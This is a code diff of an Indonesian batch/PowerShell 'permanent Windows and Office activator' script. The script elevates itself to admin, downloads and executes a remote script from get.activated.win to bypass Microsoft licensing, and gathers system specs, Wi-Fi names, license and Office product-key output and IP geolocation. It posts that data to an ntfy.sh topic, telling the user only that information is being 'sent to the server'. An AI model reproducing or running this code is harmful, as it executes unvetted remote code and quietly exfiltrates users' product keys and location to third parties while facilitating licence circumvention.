@@ -1,7 +1,7 @@
 <# ::
 @echo off
 title // ACTIVATOR WINDOWS + OFFICE PERMANENT - INDOJAVA ONLINE - HINZDC X SARGA
-mode con cols=90 lines=36
+mode con cols=90 lines=41
 color 0B
 
 :Begin UAC check and Auto-Elevate Permissions
@@ -37,24 +37,7 @@ echo:
     CD /D "%~dp0"
 
 cls
-echo.
-echo                                                   ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
-echo          ÉÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏ¹ ISTANA BEC LANTAI 1 BLOK D7 º
-echo          º                                        ÈÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ¹
-echo          º   ÛÛ                                ÛÛ                               º
-echo          º   °° ÛÛÛÛÛÛ±± ÛÛÛÛÛÛÜß ÛÛÛÛÛÛÛ      °° ÛÛÛÛÛÛÛÛ ÛÛ     ÛÛ ÛÛÛÛÛÛÛÛ   º
-echo          º   ÛÛ       ÛÛ ÛÛ   ßÛÛ ÛÛ   ÛÛ      ÛÛ ÛÛ    ÛÛ ÛÛ     ÛÛ ÛÛ    ÛÛ   º
-echo          º   ÛÛ ÛÛ    ÛÛ ÛÛ   ÜÛÛ ÛÛ   ÛÛ ÛÛ   ÛÛ ÛÛÛÛÛÛÛÛ ßÛÛ   ÛÛß ÛÛÛÛÛÛÛÛ   º
-echo          º   ÛÛ ÛÛ    ÛÛ ÛÛÛÛÛÛßÜ ±±ÛÛÛÛÛ ÛÛÛÛÛÛÛ ÛÛ    ÛÛ    ßÛß    ÛÛ    ÛÛ   º
-echo          º                                                                      º
-echo          ÈÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑ¼
-rem echo                         -- ACTIVATOR WINDOWS ^& OFFICE PERMANENT --
-powershell "write-host -fore 'Red' '                        -- ACTIVATOR WINDOWS & OFFICE PERMANENT --'
-echo.
-echo ------------------------------------------------------------------------------------------
-echo    SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING
-echo ------------------------------------------------------------------------------------------
-timeout /t 7 >NUL 2>&1
+
 powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
 goto :eof
 
@@ -128,8 +111,33 @@ function UnQuickEdit
 }
 UnQuickEdit
 #-----------------------------------------------------------------------------------------
+[Console]::OutputEncoding = [System.Text.Encoding]::utf8
+Clear-Host
+# ASCII Art dalam Unicode [char]
+$text = @"
 
+                                                  $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
+         $([char]0x2554)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2563) ISTANA BEC LANTAI 1 BLOK D7 $([char]0x2551)
+         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2563)
+         $([char]0x2551)   $([char]0x2588)$([char]0x2588)                                $([char]0x2588)$([char]0x2588)                               $([char]0x2551)
+         $([char]0x2551)   $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2584)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)      $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
+         $([char]0x2551)   $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)      $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
+         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2580)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
+         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2580)$([char]0x2584) $([char]0x2592)$([char]0x2592)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)    $([char]0x2580)$([char]0x2588)$([char]0x2580)    $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
+         $([char]0x2551)                                                                      $([char]0x2551)
+         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
+"@
+
+Write-Host $text -ForegroundColor Cyan
+Write-Host "                         -- ACTIVATOR WINDOWS & OFFICE PERMANENT --" -ForegroundColor Red
+Write-Host "------------------------------------------------------------------------------------------"
+Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   "
+Write-Host "------------------------------------------------------------------------------------------"
 $Host.UI.RawUI.WindowTitle = '// ACTIVATOR WINDOWS + OFFICE PERMANENT // - INDOJAVA ONLINE - HINZDC X SARGA'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Start-Sleep -s 3
+
+#-----------------------------------------------------------------------------------------
 $StartDTM = (Get-Date)
 Write-Host " START " -BackgroundColor Green -ForegroundColor White -NoNewline
 Write-Host " $StartDTM " -BackgroundColor White -ForegroundColor Black
@@ -213,14 +221,25 @@ $kataMutiara = @(
     "Dunia ini hanyalah bayangan, kejar bayangan itu, dan ia akan lari darimu. Tapi berpalinglah dari bayangan itu, maka ia akan mengikutimu."
     "Waktu adalah pedang; jika kamu tidak memanfaatkannya, maka ia akan memotongmu."
     "Barang siapa mengenal dirinya, maka ia akan mengenal Tuhannya."
-    
-
+    "Jika kmau merasakan sakit, kamu hidup. Jika kamu merasakan sakit orang lain, kamu adalah seorang manusia - Leo Tolstoy."
+    "Apa yang membuatmu begitu takut kehilangan, jika sebenarnya tidak ada satu pun di dunia ini yang benar benar menjadi milikmu?"
+    "Banyak orang menjadi tidak menarik setelah kamu mengetahui cara berpikir mereka. - Damian Marley"
+    "Tidak ada yang dapat membunuhmu lebih cepat daripada pikiranmu sendiri. Tetap tenang dan jangan stress atas hal-hal yang berada di luar kendalimu"
+    "Tidak ada yang bisa didapatkan tanpa kehilangan. Bahkan Surga menuntut kematian. - The Eagle"
+    "saya cukup pintar untuk tahu bahwa saya bodoh. - Richard Feynman"
+    "Lebih mudah untuk menipu seseorang daripada meyakinkan mereka bahwa mereka telah ditipu. - Mark Twain"
+    "kenyataan tidak pernah sebaik imajinasimu. - Pepatah Jepang"
+    "Aku talah belajar selama bertahun-tahun bahwa bukan tempat tinggalmu yang penting, melainkan ora-orang yang ada di sekitarmu yang membuatmu merasa di rumah. -J.B. McGee"
+    "Hanya butuh 2 tahun untuk belajar berbicara dan enam puluh tahun untuk belajar diam. - Ernest Hemingway"
+    "Ketika hendak melakukan perjalanan, janganlah meminta nasihat dari orang yan tidak pernah meninggalkan rumah. - Rumi"
+    "Permasalahan dunia adalah orang cerdas penuh keraguan, dan orang bodoh penuh percaya diri. - Bertrand Russell"
+    "Jika segala sesuatu di sekiatar kamu tampak gelap. coba lihat lagi, mungkin kamu yang memancarkan cahaya. - Rumi"
 )
 
 # Mengambil satu kata mutiara secara acak
 $kataAcak = Get-Random -InputObject $kataMutiara
 
-function Wrap-TextToFitWidth {
+function WrapTextToFitWidth {
     param (
         [string]$text  # Teks yang ingin dibungkus
     )
@@ -252,49 +271,65 @@ function Wrap-TextToFitWidth {
 
 $text = $kataAcak
 #-----------------------------------------------------------------------------------------
-function ntfy {
-    # URL untuk ntfy.sh
-    $ntfyUrl = "https://ntfy.sh/eu9QDaPa1mExQPwp"
-
-    # Mendapatkan merek dan tipe/model perangkat dan spesifikasi perangkat
+function Get-ComputerSystemInfo {
     $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
-    $manufacturer = $computerSystem.Vendor
-    $tipe = $computerSystem.Version
-    $systemmodel = $computerSystem.Name
+    return @{
+        Manufacturer = $computerSystem.Vendor
+        Type = $computerSystem.Version
+        Model = $computerSystem.Name
+    }
+}
+
+function Get-OSInfo {
     $os = Get-CimInstance -ClassName Win32_OperatingSystem
     $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
     if (-not $winversion) {
         $winversion = $null
     }
+    return @{
+        OSName = $os.Caption
+        OSVersion = $os.Version
+        WindowsVersion = $winversion
+        Architecture = $os.OSArchitecture
+    }
+}
+
+function Get-ProcessorInfo {
     $processor = Get-CimInstance -ClassName Win32_Processor
+    return @{
+        Name = $processor.Name
+        Cores = $processor.NumberOfCores
+        LogicalProcessors = $processor.NumberOfLogicalProcessors
+    }
+}
+
+function Get-RAMInfo {
     $ramInfo = Get-WmiObject Win32_PhysicalMemory
-    # Variabel untuk menghitung total ukuran RAM
     $totalSizeInGB = 0
-    # Array untuk menyimpan informasi setiap modul RAM
     $ramDetails = @()
-    # Loop melalui setiap modul RAM untuk mengambil Size, Manufacturer, dan Speed
     foreach ($ram in $ramInfo) {
-        # Hitung ukuran RAM dalam GB untuk modul saat ini
         $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
-        # Tambahkan ukuran RAM ke total
         $totalSizeInGB += $sizeInGB
-        # Tambahkan detail modul ke array
         $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
     }
+    return @{
+        TotalSizeInGB = $totalSizeInGB
+        Modules = $ramDetails -join " -- "
+    }
+}
 
-    # Gabungkan detail setiap modul dalam satu baris
-    $modulesOutput = $ramDetails -join " -- "
-
+function Get-DiskInfo {
     $disks = Get-CimInstance -ClassName Win32_DiskDrive
-    # Menyusun informasi disk
     $diskall = ""
     foreach ($disk in $disks) {
         $modeldisk = $disk.Model
-        $sizeInGB = [math]::round($disk.Size / 1GB, 2)  # Mengonversi size ke GB dan membulatkan ke 2 desimal
+        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
         $diskall += "- $modeldisk - $sizeInGB GB`n"
     }
+    return $diskall
+}
 
-    # Mendapatkan nama Wi-Fi yang terhubung
+function Get-NetworkInfo {
     $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
     if ($wifi) {
         $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
@@ -302,7 +337,6 @@ function ntfy {
         $wifiName = "Tidak ada Wi-Fi yang terhubung."
     }
 
-    # Mengecek koneksi internet melalui LAN
     $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
     if ($lanAdapter) {
         $lanStatus = "LAN terhubung: $($lanAdapter.Name)"
@@ -316,52 +350,60 @@ function ntfy {
         $lanStatus = "Tidak ada LAN yang terhubung."
         $internetStatus = "Internet melalui LAN tidak tersedia."
     }
-#-----------------------------------------------------------------------------------------
-    # get activation status
+
+    return @{
+        WifiName = $wifiName
+        LanStatus = $lanStatus
+        InternetStatus = $internetStatus
+    }
+}
+
+function Get-ActivationStatus {
     $SlmgrDli = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /dli 2>&1
     $SlmgrXpr = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr 2>&1
+    return @{
+        SlmgrDli = $SlmgrDli
+        SlmgrXpr = $SlmgrXpr
+    }
+}
 
-    # Fungsi untuk memeriksa Ohook
-    function CheckOhook {
-        $ohook = 0
-        $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")
+function CheckOhook {
+    $ohook = 0
+    $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")
 
-        # Loop untuk memeriksa Office versi 15 dan 16
-        foreach ($version in 15, 16) {
+    foreach ($version in 15, 16) {
+        foreach ($path in $paths) {
+            if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
+                $ohook = 1
+            }
+        }
+    }
+
+    foreach ($systemFolder in "System", "SystemX86") {
+        foreach ($officeFolder in "Office 15", "Office") {
             foreach ($path in $paths) {
-                if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
+                if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
                     $ohook = 1
                 }
             }
         }
-
-        # Loop untuk memeriksa System dan SystemX86 pada Office 15 dan Office (tanpa versi)
-        foreach ($systemFolder in "System", "SystemX86") {
-            foreach ($officeFolder in "Office 15", "Office") {
-                foreach ($path in $paths) {
-                    if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
-                        $ohook = 1
-                    }
-                }
-            }
-        }
-
-        # Jika tidak ada Ohook yang ditemukan
-        if ($ohook -eq 0) {
-            return "Ohook tidak ditemukan."
-        }
-
-        # Jika Ohook ditemukan
-        return @"
-    -----------------------------------------------------
-    // Office Ohook Status //
-    
-    Ohook for permanent Office activation is installed.
-    You can ignore the below mentioned Office activation status.
-"@
     }
 
-    # Daftar jalur potensial untuk OSPP.VBS (Office15 dan Office16, 32-bit dan 64-bit)
+    if ($ohook -eq 0) {
+        return @"
+        // Ohook Office Activation Status //
+        Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.
+"@
+    }
+    
+    return @"
+    // Ohook Office Activation Status //
+    
+    Ohook for permanent Office activation is installed.
+"@
+}
+
+function Get-OfficeActivationStatus {
     $osppPaths = @(
         "$env:ProgramFiles\Microsoft Office\Office16\OSPP.VBS",
         "$env:ProgramFiles(x86)\Microsoft Office\Office16\OSPP.VBS",
@@ -369,21 +411,15 @@ function ntfy {
         "$env:ProgramFiles(x86)\Microsoft Office\Office15\OSPP.VBS"
     )
 
-    # Cari jalur yang valid pertama
     $validPath = $osppPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
 
     if ($validPath) {
-        # Jalankan OSPP.VBS jika jalur ditemukan
         $output = cscript $validPath /dstatus | Out-String
     } else {
-
+        return @()
     }
 
-
-    # Pisahkan output ke dalam array berdasarkan baris
     $outputLines = $output -split "`n"
-
-    # Variabel untuk menyimpan informasi Office
     $entries = @()
     $currentEntry = @{
         ProductID = ""
@@ -397,7 +433,6 @@ function ntfy {
         ProductKey = ""
     }
 
-    # Loop untuk mengumpulkan informasi Office
     foreach ($line in $outputLines) {
         if ($line -match "PRODUCT ID:") {
             $currentEntry.ProductID = $line.Trim()
@@ -437,38 +472,59 @@ function ntfy {
     if ($currentEntry.LicenseName) {
         $entries += $currentEntry
     }
-#-----------------------------------------------------------------------------------------
-    # Gabungkan informasi
+    return $entries
+}
+
+function Get-IPInfo {
+    return Invoke-RestMethod -Uri "http://ip-api.com/json/"
+}
+
+function ntfy {
+    $ntfyUrl = "https://ntfy.sh/eu9QDaPa1mExQPwp"
+    $computerSystem = Get-ComputerSystemInfo
+    $osInfo = Get-OSInfo
+    $processorInfo = Get-ProcessorInfo
+    $ramInfo = Get-RAMInfo
+    $diskInfo = Get-DiskInfo
+    $networkInfo = Get-NetworkInfo
+    $activationStatus = Get-ActivationStatus
+    $officeActivationStatus = Get-OfficeActivationStatus
+    $ipInfo = Get-IPInfo
+
     $message = @"
     /// iex(irm indojava.online/get/activeauto) ///
-    ---[ SPESIFIKASI ]--------------------------------------
-    Merek: $manufacturer
-    Model: $tipe ($systemmodel)
-    Prosesor: $($processor.Name) ($($processor.NumberOfCores) Core) ($($processor.NumberOfLogicalProcessors) Logical)
-    RAM: $totalSizeInGB GB // $modulesOutput
+    ---[ SPESIFIKASI ]-------------------
+    Merek: $($computerSystem.Manufacturer)
+    Model: $($computerSystem.Type) ($($computerSystem.Model))
+    Prosesor: $($processorInfo.Name) ($($processorInfo.Cores) Core) ($($processorInfo.LogicalProcessors) Logical)
+    RAM: $($ramInfo.TotalSizeInGB) GB // $($ramInfo.Modules)
     Disk Drive:
-    $diskall
-    ---[ SISTEM ]-------------------------------------------
-    Nama OS: $($os.Caption)
-    Versi OS: $($os.Version)
-    Windows Version: $winversion
-    Arsitektur: $($os.OSArchitecture)
+    $diskInfo
+    ---[ SISTEM ]-------------------
+    Nama OS: $($osInfo.OSName)
+    Versi OS: $($osInfo.OSVersion)
+    Windows Version: $($osInfo.WindowsVersion)
+    Arsitektur: $($osInfo.Architecture)
 
-    ---[ NETWORK ]------------------------------------------
-    Wi-Fi Terhubung: $wifiName
-    $lanStatus
-    $internetStatus
+    ---[ NETWORK ]-------------------
+    Wi-Fi Terhubung: $($networkInfo.WifiName)
+    $($networkInfo.LanStatus)
+    $($networkInfo.InternetStatus)
 
-    ---[ WINDOWS LICENSE ]----------------------------------
-    $SlmgrDli
-    $SlmgrXpr
+    ---[ ADDRESS ]-------------------
+    $($ipInfo.country),  $($ipInfo.city), $($ipInfo.regionName) ($($ipInfo.zip))
+    $($ipInfo.lat)  $($ipInfo.lon) - $($ipInfo.isp)
 
-    ---[ MICROSOFT OFFICE ]---------------------------------
+    ---[ WINDOWS LICENSE ]-------------------
+    $($activationStatus.SlmgrDli)
+    $($activationStatus.SlmgrXpr)
+
+    ---[ MICROSOFT OFFICE ]-------------------
     $(CheckOhook)
 
 "@
 
-    foreach ($entry in $entries) {
+    foreach ($entry in $officeActivationStatus) {
         $message += @"
     ---------------------------------------------------------------
     $($entry.ProductID)
@@ -482,16 +538,14 @@ function ntfy {
     $($entry.ProductKey)
     
 "@
-}
-#-----------------------------------------------------------------------------------------
-    # Kirim pesan ke ntfy.sh
+    }
+
     $response = Invoke-RestMethod -Uri $ntfyUrl -Method POST -Body $message -Headers @{
         "Title" = "Aktivasi Windows dan Office"
         "Priority" = "default"
         "Tags" = "computer"
     }
 
-    # Tampilkan hasil pengiriman
     if ($response) {
         Write-host -NoNewLine
     } else {
@@ -501,11 +555,69 @@ function ntfy {
 #-----------------------------------------------------------------------------------------
 Write-Host "----------------------------"
 Write-Host
-Write-Host " + GETING SCRIPT.."
-Write-Host " + ACTIVATING.."
-& ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /HWID /Ohook | Out-Null
-Write-Host " >> PROSES AKTIVASI SELESAI.. SELAMAT MENGGUNAKAN.." -ForegroundColor Green
-Write-Host
+Write-Host " + GETTING SCRIPT.." -ForegroundColor white
+Start-Sleep -Seconds 2
+Write-Host " + ACTIVATING.." -ForegroundColor white
+
+try {
+    # Menjalankan perintah aktivasi
+    & ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /HWID /Ohook | Out-Null
+    start-sleep -Seconds 3
+    Write-Host " >> PROSES AKTIVASI SELESAI.. " -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    write-host " >> CEK STATUS AKTIVASI" -ForegroundColor Yellow
+    start-sleep -Seconds 3
+    Write-Host "   ----------------------------"
+    # Jalankan perintah slmgr.vbs untuk mendapatkan status aktivasi
+    $SlmgrXpr = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr 2>&1
+
+    Write-Host "   // Windows Activation Status //" -foregroundColor white
+
+    # Ubah hasil output menjadi string
+    $ActivationStatus = $SlmgrXpr -join " "
+    
+    # Cek status aktivasi dan tampilkan pesan yang sesuai
+    if ($ActivationStatus -match "permanently activated") {
+        write-host "   The machine is permanently activated." -ForegroundColor Green
+    }
+    elseif ($ActivationStatus -match "will expire on (\d{1,2}/\d{1,2}/\d{4})") {
+        $ExpireDate = $matches[1]
+        Write-Host "    Windows activation will expire on: $ExpireDate" -ForegroundColor Yellow
+    }
+    elseif ($ActivationStatus -match "notification mode") {
+        Write-Host "    Windows is in Notification Mode (Not activated)." -ForegroundColor Red
+    }
+    else {
+        Write-Host "    Windows activation status: Unknown or not activated." -ForegroundColor Red
+    }
+    
+    start-sleep -Seconds 2
+    Write-Host "   ----------------------------"
+    $hookActivationStatus = $(CheckOhook) -join " "
+    
+    # Cek status aktivasi dan tampilkan pesan yang sesuai
+    if ($hookActivationStatus -match "Ohook Office aktivasi tidak ditemukan") {
+        Write-Host "   // Office Activation Status //" -foregroundColor white
+        Write-Host "   Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi." -ForegroundColor Red
+    }
+    elseif ($hookActivationStatus -match "Ohook for permanent Office activation is installed") {
+        Write-Host "   // Office Activation Status //" -ForegroundColor white
+        Write-Host "   Ohook for permanent Office activation is installed" -ForegroundColor Green
+    }
+    else {
+        Write-Host "  // Office Activation Status //" -ForegroundColor Red
+        Write-Host "  Office activation status: Unknown atau silakan cek manual." -ForegroundColor Red
+    }
+
+}
+catch {
+    # Menangani error jika terjadi kesalahan
+    write-host " X AKTIVASI GAGAL." -ForegroundColor Red
+    Write-Host " X TERJADI KESALAHAN SELAMA AKTIVASI." -ForegroundColor Red
+    Write-Host " X DETAIL ERROR: $_" -ForegroundColor Yellow
+    Write-Host " X SILAHKAN COBA LAGI.." -ForegroundColor Yellow
+}
+
 Write-Host
 Write-Host " >> MENGIRIM INFORMASI KE SERVER.." -ForegroundColor Yellow
 ntfy
@@ -521,7 +633,7 @@ $RemainingSeconds = [math]::Floor($TotalSeconds % 60)  # Hitung sisa detik tanpa
 Write-Host " TOTAL PROSES: " -BackgroundColor blue -ForegroundColor white -NoNewLine
 Write-Host " $TotalMinutes Menit $RemainingSeconds Detik " -BackgroundColor red -ForegroundColor white
 Write-Host "------------------------------------------------------------------------------------------"
-Wrap-TextToFitWidth -text $text
+WrapTextToFitWidth -text $text
 Write-Host "------------------------------------------------------------------------------------------"
 Write-Host " PRESS " -NoNewLine
 Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
